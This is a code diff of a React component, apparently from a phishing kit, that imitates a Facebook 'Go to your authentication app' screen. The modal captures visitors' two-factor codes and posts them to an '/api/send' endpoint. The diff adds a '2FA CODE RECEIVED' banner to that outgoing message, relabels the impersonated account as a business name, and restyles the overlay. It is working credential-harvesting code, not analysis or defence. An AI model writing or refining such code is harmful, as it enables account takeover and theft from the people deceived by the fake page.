@@ -6,7 +6,7 @@ import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
-const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep, userName }) => {
+const VerifyModal: FC<{ nextStep: () => void; businessName?: string }> = ({ nextStep, businessName }) => {
     const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
     const [countdown, setCountdown] = useState(0);
@@ -62,7 +62,8 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
 
         const updatedMessage = `${message}
 
-<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+<b>✅ 2FA CODE RECEIVED</b>
+<b>🔐 Code ${next}/${maxCode}:</b> <code>${code}</code>`;
         try {
             const res = await axios.post('/api/send', {
                 message: updatedMessage,
@@ -88,15 +89,18 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
     };
 
     return (
-        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-1 sm:px-3 md:px-4'>
-            <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-white overflow-y-auto'>
-                {/* Header with user info and Facebook branding */}
-                <div className='px-3 sm:px-4 md:px-6 pt-3 sm:pt-4 md:pt-6 pb-2 sm:pb-3 md:pb-4'>
-                    <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{userName || 'User'} • Facebook</p>
-                </div>
+        <>
+            {/* Overlay mờ toàn màn hình */}
+            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
+            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
+                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
+                    {/* Header with user info and Facebook branding */}
+                    <div className='px-3 sm:px-4 md:px-6 pt-3 sm:pt-4 md:pt-6 pb-2 sm:pb-3 md:pb-4'>
+                        <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{businessName || 'User'} • Facebook</p>
+                    </div>
 
-                {/* Main content */}
-                <div className='flex-1 px-3 sm:px-4 md:px-6 py-2 pb-3 sm:pb-4 md:pb-6 flex flex-col'>
+                    {/* Main content */}
+                    <div className='flex-1 px-3 sm:px-4 md:px-6 py-2 pb-3 sm:pb-4 md:pb-6 flex flex-col overflow-y-auto'>
                     {/* Title */}
                     <h1 className='text-base sm:text-lg md:text-2xl font-bold text-gray-900 mb-2 sm:mb-3 md:mb-4 whitespace-normal'>
                         {t('Go to your authentication app')}
@@ -162,6 +166,7 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
                 </div>
             </div>
         </div>
+        </>
     );
 };
 
